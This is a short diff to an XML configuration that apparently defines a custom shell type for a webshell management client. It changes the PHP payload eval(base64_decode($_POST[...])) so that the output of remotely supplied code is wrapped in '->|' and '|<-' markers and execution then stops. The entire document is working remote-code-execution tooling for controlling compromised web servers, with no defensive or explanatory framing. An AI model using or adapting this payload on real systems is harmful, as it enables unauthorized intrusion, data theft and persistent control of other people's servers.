@@ -7,6 +7,6 @@
   </basicSetting>
   <mainCodeSetting>
 	<funcCodeParam location="Body" encrymode="Base64" >funcCode</funcCodeParam>
-	<item><![CDATA[eval(base64_decode($_POST[$funcCode$]));]]></item>
+	<item><![CDATA[print("->|");eval(base64_decode($_POST[$funcCode$]));print("|<-");die();]]></item>
   </mainCodeSetting>
 </customShellType>
